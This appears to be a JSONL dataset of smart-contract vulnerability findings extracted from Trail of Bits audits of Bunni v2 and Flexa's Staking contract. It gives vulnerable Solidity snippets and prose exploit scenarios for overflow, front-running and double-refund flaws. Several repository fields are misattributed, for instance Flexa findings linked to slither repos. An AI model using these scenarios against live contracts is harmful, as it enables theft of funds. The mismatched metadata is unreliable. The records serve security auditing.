calculation of input and output amount, the updatedActiveBalance for token1 becomes less than the currentActiveBalance of token1; this condition is not accounted for, as highlighted in figure 18.1. This results in an arithmetic underflow that causes the swap operation to revert.\n\nWe discovered this issue with Medusa during the invariant testing process.\n\n\n#### Recommendations\n\nShort term, triage the underlying root cause of the above finding and deploy a fix such that the swap operation does not cause an underflow.\n\nLong term, consider integrating Medusa to generate invariants at both the function and system levels, enabling the testing of operations that involve complex mathematics and liquidity pricing curves.\n", "severity": "Undetermined", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-BUNNI-18", "target": {"path": "src/lib/BunniSwapMath.col", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/BunniSwapMath.col", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-18", "Target": "src/lib/BunniSwapMath.col"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-019", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 19, "page_start": 63, "title": "cumulativeAmount0 can be greater than the cumulative amount computed through inverse functionality for certain LDFs", "short_summary": null, "description_md": "#### Description\n\nThe cumulative amount of token0, when computed through different methods, can vary for certain types of LDFs, leading to incorrect calculations of liquidity densities for token0.\n\nGiven a cumulativeAmount0, the function inverseCumulativeAmount0, in the contracts UniformDistribution and CarpetedGeometricDistribution, computes the rounded tick whose cumulativeAmount0 is expected to be less than or equal to the given cumulativeAmount0.\n\n```\nif (exactIn) {\n (inputAmount, outputAmount) = zeroForOne\n ? ...\n : (\n naiveSwapAmountIn + cumulativeAmount - currentActiveBalance1,\n currentActiveBalance0 + naiveSwapAmountOut\n - input.liquidityDensityFunction.cumulativeAmount0(...)\n );\n } else {\n (inputAmount, outputAmount) = zeroForOne\n ? (\n input.liquidityDensityFunction.cumulativeAmount0(...)\n : ...\n }\n return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);\n}\n```\n\n*Figure 19.1: Snippet of the \\_computeSwap function in the BunniSwapMath library ([src/lib/BunniSwapMath.sol#L246–L303](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L246-L303))*\n\nHowever, both distributions deviate from the expected behavior, as in some cases, the computed cumulativeAmount0 exceeds the given cumulativeAmount0. These cumulativeAmount0 values are used throughout the swap process to calculate the input and output amounts, as illustrated in figure 19.1, leading to inaccurate swap computations.\n\nWe discovered this issue with Medusa during the invariant testing process.\n", "full_markdown": "## 19. cumulativeAmount0 can be greater than the cumulative amount computed through inverse functionality for certain LDFs\n\n| Severity: Undetermined     | Diffi culty: Low         |\n|-------------------------------|--------------------------------|\n| Type: Data Validation   | Finding ID: TOB-BUNNI-19 |\n| Target: Various targets |                                |\n\n#### Description\n\nThe cumulative amount of token0, when computed through different methods, can vary for certain types of LDFs, leading to incorrect calculations of liquidity densities for token0.\n\nGiven a cumulativeAmount0, the function inverseCumulativeAmount0, in the contracts UniformDistribution and CarpetedGeometricDistribution, computes the rounded tick whose cumulativeAmount0 is expected to be less than or equal to the given cumulativeAmount0.\n\n```\nif (exactIn) {\n (inputAmount, outputAmount) = zeroForOne\n ? ...\n : (\n naiveSwapAmountIn + cumulativeAmount - currentActiveBalance1,\n currentActiveBalance0 + naiveSwapAmountOut\n - input.liquidityDensityFunction.cumulativeAmount0(...)\n );\n } else {\n (inputAmount, outputAmount) = zeroForOne\n ? (\n input.liquidityDensityFunction.cumulativeAmount0(...)\n : ...\n }\n return (updatedSqrtPriceX96, updatedTick, inputAmount, outputAmount);\n}\n```\n\n*Figure 19.1: Snippet of the \\_computeSwap function in the BunniSwapMath library ([src/lib/BunniSwapMath.sol#L246–L303](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniSwapMath.sol#L246-L303))*\n\nHowever, both distributions deviate from the expected behavior, as in some cases, the computed cumulativeAmount0 exceeds the given cumulativeAmount0. These cumulativeAmount0 values are used throughout the swap process to calculate the input and output amounts, as illustrated in figure 19.1, leading to inaccurate swap computations.\n\nWe discovered this issue with Medusa during the invariant testing process.\n\n\n#### Recommendations\n\nShort term, triage the underlying root cause of the above finding and deploy a fix such that the LDF functionalities behave as expected.\n\nLong term, consider integrating Medusa to generate invariants at both the function and system levels, enabling the testing of operations that involve complex mathematics and liquidity pricing curves.\n", "severity": "Undetermined", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-19", "target": {"path": "Various targets", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "Various targets", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-19", "Target": "Various targets"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-001", "doc_id": "trailofbits_Flexa", "finding_index": 1, "page_start": 9, "title": "Initialconfiguration may allowan attacker to refund an unconfirmed deposit early on", "short_summary": null, "description_md": "#### **Description**\n\nInteger overflow allows users to refund deposits during the initial Staking configuration.\n\nTo refund a deposit, the withdrawal period must be active:\n\n```\n function refundPendingDeposit ( uint256 depositNonce ) external {\n address depositor = _nonceToPendingDeposit[depositNonce].depositor;\n require (\n msg . sender == _owner || msg . sender == depositor,\n \"Only the owner or depositor can initiate the refund of a pending deposit\"\n );\n require (\n _fallbackSetDate + _fallbackWithdawalDelaySeconds <= block . timestamp ,\n \"Fallback withdrawal period is not active, so refunds are not permitted\"\n );\n```\n\n*Figure 1.1: refundPendingDeposit (Staking.sol#L327-L336).*\n\nThe withdrawal period check is vulnerable to an integer overflow:\n\n```\n _fallbackSetDate + _fallbackWithdawalDelaySeconds <= block . timestam\n```\n\nThe initial value of \\_fallbackSetDate is 2\\*\\*(256-1) and\n\n\\_fallbackWithdawalDelaySeconds is 1 weeks :\n\n```\n uint256 public _fallbackSetDate = 2 ^ 256 - 1 ;\n```\n\n*Figure 1.2: \\_fallbackSetDate initial value (Staking.sol#L41.)*\n\n```\nuint256 public _fallbackWithdawalDelaySeconds = 1 weeks ;\n```\n\n*Figure 1.3: \\_fallbackWithdawalDelaySeconds initial value (Staking.sol#L25).*\n\nThese values will trigger the integer overflow. As a result, the withdrawal period is enabled upon the contract's deployment. Additionally, the overflow can be reached by an incorrect configuration.\n", "full_markdown": "### 1. Initialconfiguration may allowan attacker to refund an unconfirmed deposit early on\n\nSeverity: Low Difficulty: Medium\n\nType: Data Validation Finding ID: TOB-Flexa-001\n\nTarget: Staking.sol\n\n#### **Description**\n\nInteger overflow allows users to refund deposits during the initial Staking configuration.\n\nTo refund a deposit, the withdrawal period must be active:\n\n```\n function refundPendingDeposit ( uint256 depositNonce ) external {\n address depositor = _nonceToPendingDeposit[depositNonce].depositor;\n require (\n msg . sender == _owner || msg . sender == depositor,\n \"Only the owner or depositor can initiate the refund of a pending deposit\"\n );\n require (\n _fallbackSetDate + _fallbackWithdawalDelaySeconds <= block . timestamp ,\n \"Fallback withdrawal period is not active, so refunds are not permitted\"\n );\n```\n\n*Figure 1.1: refundPendingDeposit (Staking.sol#L327-L336).*\n\nThe withdrawal period check is vulnerable to an integer overflow:\n\n```\n _fallbackSetDate + _fallbackWithdawalDelaySeconds <= block . timestam\n```\n\nThe initial value of \\_fallbackSetDate is 2\\*\\*(256-1) and\n\n\\_fallbackWithdawalDelaySeconds is 1 weeks :\n\n```\n uint256 public _fallbackSetDate = 2 ^ 256 - 1 ;\n```\n\n*Figure 1.2: \\_fallbackSetDate initial value (Staking.sol#L41.)*\n\n```\nuint256 public _fallbackWithdawalDelaySeconds = 1 weeks ;\n```\n\n*Figure 1.3: \\_fallbackWithdawalDelaySeconds initial value (Staking.sol#L25).*\n\nThese values will trigger the integer overflow. As a result, the withdrawal period is enabled upon the contract's deployment. Additionally, the overflow can be reached by an incorrect configuration.\n\n#### **Exploit Scenario**\n\n\nBob deploys the contract. Bob plans to wait a few days before publishing the fallback withdrawal root. Eve spams the network with deposits that she withdraws immediately.\n\n#### **Recommendation**\n\nShort term, change the initial value of \\_fallbackSetDate to prevent the overflow. Prevent overflow on the withdrawal period verification in withdrawFallback and refundPendingDeposit.\n\nLong term, use SafeMath for all arithmetic operations.\n", "severity": "Low", "difficulty": "Medium", "type": "Data Validation", "finding_id": "TOB-Flexa-001", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/trailofbits/slither", "org": "trailofbits", "name": "slither", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Medium", "Type": "Data Validation", "Finding ID": "TOB-Flexa-001", "Target": "Staking.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-002", "doc_id": "trailofbits_Flexa", "finding_index": 2, "page_start": 11, "title": "Front-running fallback root update might lead to additionalwithdrawal", "short_summary": null, "description_md": "#### **Description**\n\nA front-running attack might allow an attacker to withdraw a deposit one additional time if the system is not updated before the fallback withdrawal period is reached.\n\nThe fallback withdrawal mechanism allows users to withdraw their deposits if the system is not updated after a given period. If the fallback root is updated at the same time that the fallback withdrawal period is active, an attacker can front-run the update and withdraw deposits that will be included by the update. If the fallback tree is not updated again, and the withdrawal period is activated a second time, the attacker will be able to withdraw the funds once more.\n", "full_markdown": "### 2. Front-running fallback root update might lead to additionalwithdrawal\n\nSeverity: High Difficulty: High\n\nType: Timing Finding ID: TOB-Flexa-002\n\nTarget: Staking.sol\n\n#### **Description**\n\nA front-running attack might allow an attacker to withdraw a deposit one additional time if the system is not updated before the fallback withdrawal period is reached.\n\nThe fallback withdrawal mechanism allows users to withdraw their deposits if the system is not updated after a given period. If the fallback root is updated at the same time that the fallback withdrawal period is active, an attacker can front-run the update and withdraw deposits that will be included by the update. If the fallback tree is not updated again, and the withdrawal period is activated a second time, the attacker will be able to withdraw the funds once more.\n\n#### **Exploit Scenario**\n\n- The fallback withdrawal period is reached.\n- **●** Eve creates a deposit of \\$10,000.\n- **●** Bob updates the fallback root, and include Eve's deposit.\n- Eve front runs Bob's transaction, and withdraws her deposit.\n- Bob is not able to update the fallback root. The fallback withdrawal period is reached again.\n- Eve withdraws her funds once more.\n\n#### **Recommendation**\n\nShort term, we recommend updating the fallback root in two calls if the withdrawal period is active:\n\n- The first call will set a tree that does not contain any deposits that were not already included.\n- The second call will set the tree that contains all the deposits that were validated on the block that contained the first call.\n\nLong term, write an incident response plan that includes strategies to handle compromise and network congestion.\n", "severity": "High", "difficulty": "High", "type": "Timing", "finding_id": "TOB-Flexa-002", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/trailofbits/slither", "org": "trailofbits", "name": "slither", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Type": "Timing", "Finding ID": "TOB-Flexa-002", "Target": "Staking.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-003", "doc_id": "trailofbits_Flexa", "finding_index": 3, "page_start": 12, "title": "Missing nonce on PendingDepositRefund event might lead to a double spend", "short_summary": null, "description_md": "#### **Description**\n\nA lack of nonce information on the deposit refund event might allow a third-party tool to confound which deposit was refunded.\n\nA deposit is identified by its unique nonce:\n\n```\ndepositNonce = ++ _depositNonce;\n_nonceToPendingDeposit[depositNonce].depositor = msg . sender ;\n_nonceToPendingDeposit[depositNonce].amount = amount;\n```\n\n*Figure 3.1: Deposit creation (Staking.sol#L160-L162).*\n\nUpon deposit refund, PendingDepositRefund is emitted:\n\n```\nemit PendingDepositRefund (depositor, amount);\n```\n\n*Figure 3.2:* PendingDepositRefund *event Staking.sol#L351).*\n\nThe event does not include the nonce. As a result, third-party tools watching the event might confound which deposit was refunded.\n\nTrail of Bits did not review the Flexa off-chain code, and could not assess the likelihood of the issue occurring in the deposit off-chain triage code.\n", "full_markdown": "### 3. Missing nonce on PendingDepositRefund event might lead to a double spend\n\nSeverity: High Difficulty: Undetermined Type: Auditing and Logging Finding ID: TOB-Flexa-003\n\nTarget: Staking.sol\n\n#### **Description**\n\nA lack of nonce information on the deposit refund event might allow a third-party tool to confound which deposit was refunded.\n\nA deposit is identified by its unique nonce:\n\n```\ndepositNonce = ++ _depositNonce;\n_nonceToPendingDeposit[depositNonce].depositor = msg . sender ;\n_nonceToPendingDeposit[depositNonce].amount = amount;\n```\n\n*Figure 3.1: Deposit creation (Staking.sol#L160-L162).*\n\nUpon deposit refund, PendingDepositRefund is emitted:\n\n```\nemit PendingDepositRefund (depositor, amount);\n```\n\n*Figure 3.2:* PendingDepositRefund *event Staking.sol#L351).*\n\nThe event does not include the nonce. As a result, third-party tools watching the event might confound which deposit was refunded.\n\nTrail of Bits did not review the Flexa off-chain code, and could not assess the likelihood of the issue occurring in the deposit off-chain triage code.\n\n#### **Exploit Scenario**\n\n- Eve has two pending deposits of \\$10,000, one with a nonce of 10 (A) and one with a nonce of 20 (B).\n- The withdrawal fallback period is active.\n- Eve refunds Deposit A by calling refundPendingDeposit (Eve has \\$10,000).\n- The off-chain code decodes the event, and thinks B was refunded. Deposit A is accepted off-chain.\n- Eve unlocks the funds from Deposit A and withdraws them (Eve has \\$20,000).\n- The system fails, and the withdraw fallback period is active again.\n- Even calls refundPendingDeposit for Deposit B, and receives \\$10,000.\n- Eve ends up with \\$30,000 for \\$20,000 invested.\n\n#### **Recommendation**\n\n\nShort term, add the nonce to the PendingDepositRefund event. Ensure the off-chain code uses it.\n\nLong term, thoroughly document every field that is needed for the off-chain code and ensure their information is correctly emitted in the on-chain code.\n", "severity": "High", "difficulty": "Undetermined", "type": "Auditing and Logging", "finding_id": "TOB-Flexa-003", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/trailofbits/slither", "org": "trailofbits", "name": "slither", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Undetermined", "Type": "Auditing and Logging", "Finding ID": "TOB-Flexa-003", "Target": "Staking.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-004", "doc_id": "trailofbits_Flexa", "finding_index": 4, "page_start": 14, "title": "Awithdrawal rootcould be added again ater removal", "short_summary": null, "description_md": "#### **Description**\n\nA deleted withdrawal root can be added again, leading to unexpected behavior for users.\n\nWithin the addWithdrawalRoot function there are validations to prevent a withdrawal root from being added if it is already present. However, in the event of a withdrawal root being removed and added again, there is no method to track whether the root has been previously added.\n\n```\n function addWithdrawalRoot (\n bytes32 root ,\n uint256 nonce ,\n bytes32[] calldata replacedRoots\n ) external {\n require (\n msg . sender == _owner || msg . sender == _withdrawalPublisher,\n \"Only the owner and withdrawal publisher can add and replace withdrawal root\nhashes\"\n );\n require (\n _maxWithdrawalRootNonce + 1 == nonce,\n \"Nonce must be exactly max nonce + 1\"\n );\n require (\n _withdrawalRootToNonce[root] == 0 ,\n \"Root already exists and is associated with a different nonce\"\n );\n _withdrawalRootToNonce[root] = nonce;\n _maxWithdrawalRootNonce = nonce;\n emit WithdrawalRootHashAddition (root, nonce);\n for ( uint256 i = 0 ; i < replacedRoots. length ; i ++ ) {\n deleteWithdrawalRoot (replacedRoots[i]);\n }\n }\n```\n\n*Figure 4.1: The* addWithdrawalRoot *function definition.*\n", "full_markdown": "### 4. Awithdrawal rootcould be added again ater removal\n\nSeverity: Informational Difficulty: Low\n\nType: Data Validation Finding ID: TOB-Flexa-004\n\nTarget: Staking.sol\n\n#### **Description**\n\nA deleted withdrawal root can be added again, leading to unexpected behavior for users.\n\nWithin the addWithdrawalRoot function there are validations to prevent a withdrawal root from being added if it is already present. However, in the event of a withdrawal root being removed and added again, there is no method to track whether the root has been previously added.\n\n```\n function addWithdrawalRoot (\n bytes32 root ,\n uint256 nonce ,\n bytes32[] calldata replacedRoots\n ) external {\n require (\n msg . sender == _owner || msg . sender == _withdrawalPublisher,\n \"Only the owner and withdrawal publisher can add and replace withdrawal root\nhashes\"\n );\n require (\n _maxWithdrawalRootNonce + 1 == nonce,\n \"Nonce must be exactly max nonce + 1\"\n );\n require (\n _withdrawalRootToNonce[root] == 0 ,\n \"Root already exists and is associated with a different nonce\"\n );\n _withdrawalRootToNonce[root] = nonce;\n _maxWithdrawalRootNonce = nonce;\n emit WithdrawalRootHashAddition (root, nonce);\n for ( uint256 i = 0 ; i < replacedRoots. length ; i ++ ) {\n deleteWithdrawalRoot (replacedRoots[i]);\n }\n }\n```\n\n*Figure 4.1: The* addWithdrawalRoot *function definition.*\n\n#### **Exploit Scenario**\n\n\n- Bob adds the Merkle root AAAA with the nonce 10.\n- Bob removes the root, and adds it again, with the nonce 11.\n- As a result, users relying on AAAA are confused.\n\n#### **Recommendation**\n\nShort term, ensure documentation is provided on the expected functionality of the withdrawal root–related functions, including the potential for duplicate roots to be posted.\n\n#### Long term, consider either:\n\n- Adding a method of validating whether a root has been previously encountered, or\n- Adding the nonce as a leaf of the root.\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-Flexa-004", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/crytic/slither", "org": "crytic", "name": "slither", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-Flexa-004", "Target": "Staking.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_Flexa-005", "doc_id": "trailofbits_Flexa", "finding_index": 5, "page_start": 16, "title": "Missing validations on administration functions", "short_summary": null, "description_md": "#### **Description**\n\nStaking relies on correct parametrization from the owner. Several administration functions lack proper input validation, which might lead to a misconfigured system or loss of privileged access.\n\nWithin the setOwner function (Figure 5.1), there is no check to ensure the 0x0 address is not provided as the newOwnerAddress parameter. This could lead to an accidental invocation of setOwner with an uninitialized value, resulting in an irrevocable loss of contract ownership.\n\n```\n function setOwner ( address newOwnerAddress ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the new owner\"\n );\n address oldValue = _owner;\n _owner = newOwnerAddress;\n emit OwnerUpdate (oldValue, _owner);\n }\n```\n\n*Figure 5.1: The* setOwner *function definition.*\n\nAdditional validations are missing within the addWithdrawalRoot (Figure 5.2) and setFallbackRoot (Figure 5.3) functions, where the root parameter could potentially be 0 in both, and the nonce can potentially be 0. In the setFallbackWithdrawalDelay function (Figure 5.4), the newFallbackDelaySeconds could be 0.\n\n```\n function addWithdrawalRoot (\n bytes32 root ,\n uint256 nonce ,\n bytes32[] calldata replacedRoots\n ) external {\n require (\n msg . sender == _owner || msg . sender == _withdrawalPublisher,\n \"Only the owner and withdrawal publisher can add and replace withdrawal root\nhashes\"\n );\n require (\n _maxWithdrawalRootNonce + 1 == nonce,\n \"Nonce must be exactly max nonce + 1\"\n```\n\n\n```\n );\n require (\n _withdrawalRootToNonce[root] == 0 ,\n \"Root already exists and is associated with a different nonce\"\n );\n _withdrawalRootToNonce[root] = nonce;\n _maxWithdrawalRootNonce = nonce;\n emit WithdrawalRootHashAddition (root, nonce);\n for ( uint256 i = 0 ; i < replacedRoots. length ; i ++ ) {\n deleteWithdrawalRoot (replacedRoots[i]);\n }\n }\n```\n\n*Figure 5.2: The* addWithdrawalRoot *function definition.*\n\n```\n function setFallbackRoot ( bytes32 root , uint256 maxDepositIncluded ) external {\n require (\n msg . sender == _owner || msg . sender == _fallbackPublisher,\n \"Only the owner and fallback publisher can set the fallback root hash\"\n );\n require (\n maxDepositIncluded >= _fallbackMaxDepositIncluded,\n \"Max deposit included must remain the same or increase\"\n );\n require (\n maxDepositIncluded <= _depositNonce,\n \"Cannot invalidate future deposits\"\n );\n _fallbackRoot = root;\n _fallbackMaxDepositIncluded = maxDepositIncluded;\n _fallbackSetDate = block . timestamp ;\n emit FallbackRootHashSet (\n root,\n _fallbackMaxDepositIncluded,\n block . timestamp\n );\n }\n```\n\n*Figure 5.3: The* setFallbackRoot *function definition.*\n\n```\n function setFallbackWithdrawalDelay ( uint256 newFallbackDelaySeconds ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the fallback withdrawal delay\"\n );\n uint256 oldDelay = _fallbackWithdawalDelaySeconds;\n```\n\n\n```\n _fallbackWithdawalDelaySeconds = newFallbackDelaySeconds;\n emit FallbackWithdrawalDelayUpdate (oldDelay, newFallbackDelaySeconds);\n }\n```\n\n*Figure 5.4: The* setFallbackWithdrawalDelay *function definition.*\n", "full_markdown": "### 5. Missing validations on administration functions\n\nSeverity: Medium Difficulty: High\n\nType: Data Validation Finding ID: TOB-Flexa-005\n\nTarget: Staking.sol\n\n#### **Description**\n\nStaking relies on correct parametrization from the owner. Several administration functions lack proper input validation, which might lead to a misconfigured system or loss of privileged access.\n\nWithin the setOwner function (Figure 5.1), there is no check to ensure the 0x0 address is not provided as the newOwnerAddress parameter. This could lead to an accidental invocation of setOwner with an uninitialized value, resulting in an irrevocable loss of contract ownership.\n\n```\n function setOwner ( address newOwnerAddress ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the new owner\"\n );\n address oldValue = _owner;\n _owner = newOwnerAddress;\n emit OwnerUpdate (oldValue, _owner);\n }\n```\n\n*Figure 5.1: The* setOwner *function definition.*\n\nAdditional validations are missing within the addWithdrawalRoot (Figure 5.2) and setFallbackRoot (Figure 5.3) functions, where the root parameter could potentially be 0 in both, and the nonce can potentially be 0. In the setFallbackWithdrawalDelay function (Figure 5.4), the newFallbackDelaySeconds could be 0.\n\n```\n function addWithdrawalRoot (\n bytes32 root ,\n uint256 nonce ,\n bytes32[] calldata replacedRoots\n ) external {\n require (\n msg . sender == _owner || msg . sender == _withdrawalPublisher,\n \"Only the owner and withdrawal publisher can add and replace withdrawal root\nhashes\"\n );\n require (\n _maxWithdrawalRootNonce + 1 == nonce,\n \"Nonce must be exactly max nonce + 1\"\n```\n\n\n```\n );\n require (\n _withdrawalRootToNonce[root] == 0 ,\n \"Root already exists and is associated with a different nonce\"\n );\n _withdrawalRootToNonce[root] = nonce;\n _maxWithdrawalRootNonce = nonce;\n emit WithdrawalRootHashAddition (root, nonce);\n for ( uint256 i = 0 ; i < replacedRoots. length ; i ++ ) {\n deleteWithdrawalRoot (replacedRoots[i]);\n }\n }\n```\n\n*Figure 5.2: The* addWithdrawalRoot *function definition.*\n\n```\n function setFallbackRoot ( bytes32 root , uint256 maxDepositIncluded ) external {\n require (\n msg . sender == _owner || msg . sender == _fallbackPublisher,\n \"Only the owner and fallback publisher can set the fallback root hash\"\n );\n require (\n maxDepositIncluded >= _fallbackMaxDepositIncluded,\n \"Max deposit included must remain the same or increase\"\n );\n require (\n maxDepositIncluded <= _depositNonce,\n \"Cannot invalidate future deposits\"\n );\n _fallbackRoot = root;\n _fallbackMaxDepositIncluded = maxDepositIncluded;\n _fallbackSetDate = block . timestamp ;\n emit FallbackRootHashSet (\n root,\n _fallbackMaxDepositIncluded,\n block . timestamp\n );\n }\n```\n\n*Figure 5.3: The* setFallbackRoot *function definition.*\n\n```\n function setFallbackWithdrawalDelay ( uint256 newFallbackDelaySeconds ) external {\n require (\n msg . sender == _owner,\n \"Only the owner can set the fallback withdrawal delay\"\n );\n uint256 oldDelay = _fallbackWithdawalDelaySeconds;\n```\n\n\n```\n _fallbackWithdawalDelaySeconds = newFallbackDelaySeconds;\n emit FallbackWithdrawalDelayUpdate (oldDelay, newFallbackDelaySeconds);\n }\n```\n\n*Figure 5.4: The* setFallbackWithdrawalDelay *function definition.*\n\n#### **Exploit Scenario**\n\n- Alice deploys the Staking contract.\n- She calls setOwner, but incorrectly sets the owner to zero.\n- As a result, she loses administration access.\n\n#### **Recommendation**\n\nShort term, ensure all inputs are appropriately validated for their zero values, including:\n\n- newOwnerAddress != 0 in setOwner (Staking.sol#L362-370).\n- newFallbackDelaySeconds != 0 in setFallbackWithdrawalDelay (Staking.sol#L442-L451).\n- root != 0 in addWithdrawalRoot (Staking.sol#L460-L488) and setFallbackRoot (Staking.sol#L517-L540).\n\nLong term, expand testing to include zero-value tests and ensure validation is appropriate even for unexpected inputs. Document the expected inputs for each function.\n", "severity": "Medium", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-Flexa-005", "target": {"path": "Staking.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Dexaran/ERC223-token-standard", "org": "Dexaran", "name": "ERC223-token-standard", "commit": null, "branch": null, "relative_file": "Staking.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "Flexa.pdf", "source_mtime": "2025-11-01T12:04:45+00:00", "report_extracted_at": "2025-11-12T02:21:33.135999+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:33.138093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-Flexa-005", "Target": "Staking.sol"}}
